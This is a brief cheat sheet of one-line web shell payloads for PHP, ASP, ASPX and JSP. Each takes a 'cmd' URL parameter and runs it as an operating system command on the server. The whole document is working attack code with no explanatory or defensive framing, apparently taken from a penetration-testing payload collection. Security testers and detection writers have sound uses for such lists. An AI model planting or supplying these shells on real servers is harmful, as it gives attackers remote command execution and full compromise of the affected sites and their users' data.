# Web Shells

## PHP
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php exec($_GET['cmd'], $output); print_r($output); ?>
<?php passthru($_GET['cmd']); ?>
```

## ASP
```asp
<% Execute("cmd.exe /c " & Request.QueryString("cmd")) %>
```

## ASPX
```aspx
<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>
```

## JSP
```jsp
<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>
```
